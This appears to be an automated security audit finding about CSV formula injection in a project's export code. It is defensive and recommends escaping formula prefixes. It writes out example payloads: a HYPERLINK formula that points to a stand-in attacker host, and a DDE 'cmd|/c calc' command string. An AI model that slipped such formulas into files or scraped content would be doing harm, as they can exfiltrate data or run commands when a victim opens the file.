# [MEDIUM] CSV formula injection via scraped, attacker-controlled content in exported CSVs

**File:** [`app/(private)/project/[projectId]/overview/utils/exportOverviewZip.ts`](https://github.com/clacladev/allsearch-open/blob/clacladev/san-salvador/blob/clacladev/app/(private)/project/[projectId]/overview/utils/exportOverviewZip.ts#L46-L81) (lines 46, 47, 53, 56, 57, 75, 81)
**Project:** san-salvador
**Severity:** MEDIUM  •  **Confidence:** low  •  **Slug:** `other-csv-injection`

## Owners

**Suggested assignee:** `claudio@tugulab.org` _(via last-committer)_

## Finding

exportOverviewZip builds CSV cells from data derived from scraped competitor/cited pages without sanitizing spreadsheet formula prefixes. In buildTopSourceContentsCsv, `content.title` (and to a lesser degree `content.url`, `content.domainCategory`) come from external HTML that an attacker controls — a malicious cited page can set its <title> to a value beginning with `=`, `+`, `-`, `@`, or a TAB/CR. `export-to-csv`'s generateCsv does not escape these characters. When the user opens the exported `top_source_contents_*.csv` (or other CSVs) in a spreadsheet application that does not sanitize formulas (e.g. Microsoft Excel), the cell is interpreted as a formula, enabling actions such as =HYPERLINK("http://attacker","click") exfiltration or =cmd|/c calc!A0 command execution depending on the spreadsheet's macro/formula policy. Bounded by the local-first single-user threat model: the victim is the operator who scraped the malicious page and then opens the export in Excel; no remote exploitation of the server is involved. The SSRF flag at L81 is a false positive — `origin` is window.location.origin (the app's own loopback origin) combined with an internal RouteHelper path, with no server-side fetch of a user-controlled URL.

## Recommendation

Sanitize every CSV cell value before passing it to generateCsv: prefix any value that starts with `=`, `+`, `-`, `@`, or begins with a TAB/CR with a single quote `'` (or wrap such cells in double quotes and escape, depending on spreadsheet target). Centralize this in the `toCsvString`/row-building helpers so all builders benefit. Alternatively, configure export-to-csv to use a custom value sanitizer if supported.

## Revalidation

**Verdict:** true-positive

Verified in app/(private)/project/[projectId]/overview/utils/exportOverviewZip.ts. buildTopSourceContentsCsv writes content.title, content.url, and content.domainCategory directly into CSV rows passed to export-to-csv's generateCsv with no sanitization. SourceContent.title traces through getSourceContentSummary to Sources.title, which is populated from scraped cited-page HTML (attacker-controlled per the documented threat model). export-to-csv@^1.4.0 does not neutralize spreadsheet formula prefixes (=, +, -, @, TAB, CR), so a malicious cited page with a <title> like =HYPERLINK("http://attacker","click") or a DDE payload will execute when the operator opens the exported top_source_contents_*.csv in a vulnerable spreadsheet. The other builders (buildTopSourceDomainsCsv, buildTopOpportunitiesCsv) are largely server-derived, but buildTopSourceContentsCsv clearly surfaces attacker-controlled title cells. Bounded to the local operator who scraped the page, hence MEDIUM rather than higher. The L81 SSRF flag is correctly identified as a false positive — origin is window.location.origin concatenated with an internal RouteHelper path.

## Recent committers (`git log`)

- clacladev <claudio@tugulab.org> (2026-07-29)
